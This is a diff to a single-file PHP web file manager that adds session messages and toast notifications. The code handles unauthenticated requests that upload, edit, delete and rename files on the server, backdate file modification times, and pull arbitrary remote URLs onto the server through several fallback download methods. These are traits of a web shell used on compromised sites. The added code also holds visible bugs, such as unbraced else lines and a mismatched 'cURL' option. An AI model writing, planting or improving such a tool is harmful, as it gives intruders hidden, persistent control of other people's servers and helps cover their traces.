@@ -24,26 +24,57 @@ $search = $_GET['search'] ?? '';
 
 // Handle POST actions
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-    if (isset($_POST['new_folder'])) mkdir($path.'/'.basename($_POST['new_folder']));
-    elseif (isset($_POST['new_file'])) file_put_contents($path.'/'.basename($_POST['new_file']), '');
-    elseif (isset($_POST['delete'])) { $t=$path.'/'.basename($_POST['delete']); is_dir($t)?rmdir($t):unlink($t);}
-    elseif (isset($_POST['rename_from']) && isset($_POST['rename_to'])) rename($path.'/'.basename($_POST['rename_from']),$path.'/'.basename($_POST['rename_to']));
-    elseif (isset($_POST['edit_file']) && isset($_POST['content'])) file_put_contents($path.'/'.basename($_POST['edit_file']),$_POST['content']);
-    elseif (isset($_FILES['files'])) foreach($_FILES['files']['tmp_name'] as $i=>$tmp) move_uploaded_file($tmp,$path.'/'.basename($_FILES['files']['name'][$i]));
-    elseif (isset($_POST['update_mtime']) && isset($_POST['mtime_value'])) { $f=$path.'/'.basename($_POST['update_mtime']); @touch($f,strtotime($_POST['mtime_value']));}
-    elseif (isset($_POST['get_content'])) { $f=$path.'/'.basename($_POST['get_content']); if(is_file($f)) echo file_get_contents($f); exit;}
-    elseif (isset($_POST['download_url'],$_POST['output_name'],$_POST['method'])) {
-        $url=trim($_POST['download_url']); $out=$path.'/'.basename($_POST['output_name']); $method=$_POST['method'];
-        switch($method){
-            case 'file_get_contents': $d=@file_get_contents($url); if($d!==false)file_put_contents($out,$d); break;
-            case 'copy': @copy($url,$out); break;
-            case 'fopen': $in=@fopen($url,'rb'); $outf=@fopen($out,'wb'); if($in&&$outf){while(!feof($in))fwrite($outf,fread($in,8192)); fclose($in); fclose($outf);} break;
-            case 'stream_context': $ctx=stream_context_create(); $d=@file_get_contents($url,false,$ctx); if($d!==false)file_put_contents($out,$d); break;
-            case 'curl':
-                $ch=curl_init($url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $d=curl_exec($ch); curl_close($ch); if($d!==false)file_put_contents($out,$d);
-                break;
+    try {
+        if (isset($_POST['new_folder'])){
+            mkdir($path.'/'.basename($_POST['new_folder']));
+            $_SESSION['msg']='Folder created'; $_SESSION['msg_type']='success';
         }
-    }
+        elseif (isset($_POST['new_file'])){
+            file_put_contents($path.'/'.basename($_POST['new_file']), '');
+            $_SESSION['msg']='File created'; $_SESSION['msg_type']='success';
+        }
+        elseif (isset($_POST['delete'])){
+            $t=$path.'/'.basename($_POST['delete']); 
+            if(is_dir($t)?rmdir($t):unlink($t)){
+                $_SESSION['msg']='Deleted successfully'; $_SESSION['msg_type']='success';
+            } else $_SESSION['msg']='Delete failed'; $_SESSION['msg_type']='error';
+        }
+        elseif (isset($_POST['rename_from'],$_POST['rename_to'])){
+            if(rename($path.'/'.basename($_POST['rename_from']),$path.'/'.basename($_POST['rename_to']))){
+                $_SESSION['msg']='Renamed successfully'; $_SESSION['msg_type']='success';
+            } else $_SESSION['msg']='Rename failed'; $_SESSION['msg_type']='error';
+        }
+        elseif (isset($_POST['edit_file'],$_POST['content'])){
+            if(file_put_contents($path.'/'.basename($_POST['edit_file']),$_POST['content'])!==false){
+                $_SESSION['msg']='Saved successfully'; $_SESSION['msg_type']='success';
+            } else $_SESSION['msg']='Save failed'; $_SESSION['msg_type']='error';
+        }
+        elseif (isset($_FILES['files'])){
+            $ok=0;
+            foreach($_FILES['files']['tmp_name'] as $i=>$tmp)
+                if(move_uploaded_file($tmp,$path.'/'.basename($_FILES['files']['name'][$i]))) $ok++;
+            $_SESSION['msg']= $ok.' file(s) uploaded'; $_SESSION['msg_type']='success';
+        }
+        elseif (isset($_POST['update_mtime'],$_POST['mtime_value'])){
+            $file=$path.'/'.basename($_POST['update_mtime']);
+            if(@touch($file, strtotime($_POST['mtime_value']))){
+                $_SESSION['msg']='Modified time updated'; $_SESSION['msg_type']='success';
+            } else $_SESSION['msg']='Update failed'; $_SESSION['msg_type']='error';
+        }
+        elseif (isset($_POST['download_url'],$_POST['output_name'],$_POST['method'])){
+            $url=trim($_POST['download_url']); $out=$path.'/'.basename($_POST['output_name']); $method=$_POST['method'];
+            $ok=false;
+            switch($method){
+                case 'file_get_contents': $d=@file_get_contents($url); if($d!==false)$ok=file_put_contents($out,$d)!==false; break;
+                case 'copy': $ok=@copy($url,$out); break;
+                case 'fopen': $in=@fopen($url,'rb'); $outf=@fopen($out,'wb'); if($in&&$outf){while(!feof($in))fwrite($outf,fread($in,8192)); fclose($in); fclose($outf); $ok=true;} break;
+                case 'stream_context': $ctx=stream_context_create(); $d=@file_get_contents($url,false,$ctx); if($d!==false)$ok=file_put_contents($out,$d)!==false; break;
+                case 'curl': $ch=curl_init($url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $d=curl_exec($ch); curl_close($ch); if($d!==false)$ok=file_put_contents($out,$d)!==false; break;
+            }
+            $_SESSION['msg']= $ok?'Download success':'Download failed'; $_SESSION['msg_type']=$ok?'success':'error';
+        }
+    } catch(Exception $e){ $_SESSION['msg']='Error: '.$e->getMessage(); $_SESSION['msg_type']='error'; }
+    header('Location: '.$_SERVER['REQUEST_URI']); exit;
 }
 
 // Scan dir
@@ -89,6 +120,8 @@ $(function(){
     $('#uploadInput').change(()=>$('#uploadForm').submit());
 });
 </script>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
 </head>
 <body class="bg-gray-100 p-4">
 <h1 class="text-2xl font-bold mb-4">📂 <?=htmlspecialchars($path)?></h1>
@@ -153,4 +186,11 @@ $(function(){
 <div id="downloaderModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
 <div class="bg-white p-4 rounded"><form method="post"><p>URL Source:</p><input name="download_url" class="border px-2 mb-2 w-full"><p>Output Name:</p><input name="output_name" class="border px-2 mb-2 w-full"><p>Method:</p><select name="method" class="border px-2 mb-2 w-full"><option>file_get_contents</option><option>cURL</option><option>fopen</option><option>copy</option><option>stream_context</option></select>
 <div class="flex justify-between"><button class="bg-purple-500 text-white px-4 py-1 rounded">⬇️ Download</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>
+
+<?php if(isset($_SESSION['msg'])): ?>
+<script>
+toastr.options = { "closeButton": true, "progressBar": true, "positionClass":"toast-top-right"};
+toastr.<?= $_SESSION['msg_type']=='error'?'error':'success' ?>("<?= addslashes($_SESSION['msg']) ?>");
+</script>
+<?php unset($_SESSION['msg'],$_SESSION['msg_type']); endif; ?>
 </body></html>
